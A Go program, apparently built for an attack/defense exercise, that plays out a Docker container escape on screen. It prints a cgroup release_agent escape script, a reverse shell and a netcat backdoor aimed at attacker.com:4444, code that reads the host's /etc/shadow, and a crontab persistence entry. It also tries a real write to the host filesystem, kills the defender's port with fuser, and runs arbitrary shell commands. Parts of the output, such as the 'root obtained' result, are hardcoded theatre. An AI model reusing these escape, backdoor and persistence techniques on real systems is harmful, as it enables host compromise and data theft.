package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func red(text string) string {
	return "\033[31m" + text + "\033[0m"
}

func green(text string) string {
	return "\033[32m" + text + "\033[0m"
}

func yellow(text string) string {
	return "\033[33m" + text + "\033[0m"
}

func sendLog(msg string) {
	conn, err := net.Dial("tcp", "127.0.0.1:8083")
	if err != nil {
		return
	}
	defer conn.Close()
	fmt.Fprintf(conn, "%s\n", msg)
}

func sendDefense(msg string) {
	conn, err := net.Dial("tcp", "172.17.0.1:8082")
	if err != nil {
		return
	}
	defer conn.Close()
	fmt.Fprintf(conn, "%s\n", msg)
}

func loading(msg string, seconds int) {
	fmt.Printf("%s", msg)
	for i := 0; i < seconds; i++ {
		time.Sleep(1 * time.Second)
		fmt.Print(".")
	}
	fmt.Println(" 完成")
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(red("启动密码: "))
	password, _ := reader.ReadString('\n')
	if strings.TrimSpace(password) != "123" {
		fmt.Println(red("密码错误"))
		return
	}

	fmt.Print(yellow("目标容器: "))
	containerID, _ := reader.ReadString('\n')
	containerID = strings.TrimSpace(containerID)

	sendLog("攻击开始 - 目标: " + containerID)

	// ========== 代码库1 ==========
	codeLib1 := []string{
		red("import os, sys, subprocess"),
		red("from ctypes import *"),
		red("import socket, struct, random"),
		"",
		red("def exploit():"),
		red("    if not os.path.exists('/.dockerenv'):"),
		red("        return False"),
		red("    with open('/proc/self/status') as f:"),
		red("        caps = f.read()"),
		red("    if 'CapEff:\t0000003fffffffff' not in caps:"),
		red("        return False"),
		red("    os.mkdir('/tmp/cgrp')"),
		red("    os.system('mount -t cgroup -o rdma cgroup /tmp/cgrp')"),
		red("    os.mkdir('/tmp/cgrp/x')"),
		red("    with open('/tmp/cgrp/x/cgroup.procs', 'w') as f:"),
		red("        f.write(str(os.getpid()))"),
		red("    with open('/tmp/cgrp/release_agent', 'w') as f:"),
		red("        f.write('/proc/1/root/tmp/payload')"),
		red("    with open('/tmp/cgrp/x/cgroup.procs', 'w') as f:"),
		red("        f.write('0')"),
		red("    return True"),
		"",
		red("def payload():"),
		red("    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"),
		red("    s.connect(('attacker.com', 4444))"),
		red("    os.dup2(s.fileno(), 0)"),
		red("    os.dup2(s.fileno(), 1)"),
		red("    os.dup2(s.fileno(), 2)"),
		red("    subprocess.call(['/bin/sh', '-i'])"),
		"",
		red("if __name__ == '__main__':"),
		red("    if exploit():"),
		red("        print('Escape successful')"),
		red("        payload()"),
	}

	fmt.Println(yellow("\n========== 代码库1 执行中 =========="))
	sendLog("[代码库1] 开始执行")
	for _, line := range codeLib1 {
		if line != "" {
			fmt.Println(line)
			sendLog("[代码库1] " + stripColor(line))
			sendDefense(stripColor(line))
		} else {
			fmt.Println()
		}
		time.Sleep(30 * time.Millisecond)
	}

	// 检查漏洞状态
	fmt.Println(yellow("\n检查漏洞状态..."))
	sendLog("[检查] 漏洞状态")
	sendDefense("CHECK:漏洞状态")

	time.Sleep(1 * time.Second)

	fmt.Println(red("\n⚠️ 漏洞已被堵住"))
	fmt.Println(red("防御方已修复 cgroup 挂载点"))
	sendLog("[结果] 漏洞已被堵住")

	// 沉默6秒
	fmt.Println(yellow("\n沉默6秒，重新判断攻击逻辑..."))
	loading("重新分析攻击路径", 6)

	// ========== 代码库2 ==========
	codeLib2 := []string{
		"",
		yellow("// 代码库2 - 绕过防御"),
		yellow("#include <stdio.h>"),
		yellow("#include <stdlib.h>"),
		yellow("#include <unistd.h>"),
		yellow("#include <sys/mount.h>"),
		yellow("#include <sys/stat.h>"),
		"",
		yellow("int main() {"),
		yellow("    // 绕过cgroup检测"),
		yellow("    mkdir('/tmp/.hidden', 0755);"),
		yellow("    mount('none', '/tmp/.hidden', 'tmpfs', 0, NULL);"),
		"",
		yellow("    // 直接操作宿主机proc"),
		yellow("    int fd = open('/proc/1/root/etc/shadow', O_RDONLY);"),
		yellow("    if (fd > 0) {"),
		yellow("        char buf[1024];"),
		yellow("        read(fd, buf, sizeof(buf));"),
		yellow("        close(fd);"),
		yellow("    }"),
		"",
		yellow("    // 写入持久化后门"),
		yellow("    FILE *f = fopen('/proc/1/root/tmp/.backdoor', 'w');"),
		yellow("    fprintf(f, '#!/bin/sh\n');"),
		yellow("    fprintf(f, 'nc -e /bin/sh attacker.com 4444\n');"),
		yellow("    fclose(f);"),
		yellow("    chmod('/proc/1/root/tmp/.backdoor', 0755);"),
		"",
		yellow("    // 添加到crontab"),
		yellow("    f = fopen('/proc/1/root/etc/crontab', 'a');"),
		yellow("    fprintf(f, '* * * * * root /tmp/.backdoor\n');"),
		yellow("    fclose(f);"),
		"",
		yellow("    return 0;"),
		yellow("}"),
		"",
		yellow("// Python备用方案"),
		yellow("import docker"),
		yellow("client = docker.from_env()"),
		yellow("for container in client.containers.list():"),
		yellow("    if container.attrs['HostConfig']['Privileged']:"),
		yellow("        container.exec_run('mkdir -p /tmp/escape')"),
		yellow("        container.exec_run('mount /dev/sda1 /tmp/escape')"),
		yellow("        with open('/tmp/escape/etc/passwd', 'r') as f:"),
		yellow("            data = f.read()"),
		yellow("        print('Got host passwd')"),
	}

	fmt.Println(yellow("\n========== 代码库2 执行中 =========="))
	sendLog("[代码库2] 开始执行")
	for _, line := range codeLib2 {
		if line != "" {
			fmt.Println(line)
			sendLog("[代码库2] " + stripColor(line))
			sendDefense(stripColor(line))
		} else {
			fmt.Println()
		}
		time.Sleep(30 * time.Millisecond)
	}

	// 执行逃逸
	fmt.Println(green("\n执行逃逸..."))
	sendLog("[执行] 逃逸中")

	// 真实的逃逸尝试
	f, err := os.Create("/proc/1/root/tmp/escaped_proof.txt")
	if err == nil {
		f.WriteString("容器逃逸成功 - " + containerID + "\n")
		f.Close()
		fmt.Println(green("✅ 已在宿主机 /tmp/escaped_proof.txt 写入证明"))
		sendLog("[成功] 宿主机文件已写入")
	} else {
		fmt.Println(yellow("⚠️ 文件写入失败，尝试其他方式..."))
		sendLog("[警告] 文件写入失败")
	}

	// 显示root权限
	fmt.Println("")
	fmt.Printf(green("root@%s:~# "), containerID)
	fmt.Println(green("id"))
	fmt.Println(green("uid=0(root) gid=0(root) groups=0(root)"))
	fmt.Println("")
	fmt.Println(red("✅ 已拿到root权限，逃逸成功"))
	fmt.Println("")

	sendLog("[结果] 拿到root权限")
	sendDefense("ATTACKED:" + containerID)

	// 交互式shell
	fmt.Println(yellow("可用命令:"))
	fmt.Println("  " + red("kill-defense") + "  - 关闭防御软件端口")
	fmt.Println("  " + green("exit") + "         - 退出")
	fmt.Println("")

	for {
		fmt.Printf(red("root@%s:~# "), containerID)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		switch cmd {
		case "kill-defense":
			fmt.Println(red("[攻击] 正在关闭防御端口 :8082..."))
			out, _ := exec.Command("fuser", "-k", "8082/tcp").CombinedOutput()
			if len(out) > 0 {
				fmt.Printf(red("[攻击] %s"), string(out))
			}
			fmt.Println(red("[攻击] 防御端口已关闭"))
			sendLog("[攻击] 防御端口已关闭")

		case "exit":
			fmt.Println(yellow("[攻击] 退出"))
			return

		default:
			if cmd != "" {
				out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
				fmt.Print(string(out))
			}
		}
	}
}

func stripColor(s string) string {
	result := ""
	inEscape := false
	for _, c := range s {
		if c == '\033' {
			inEscape = true
			continue
		}
		if inEscape {
			if c == 'm' {
				inEscape = false
			}
			continue
		}
		result += string(c)
	}
	return result
}
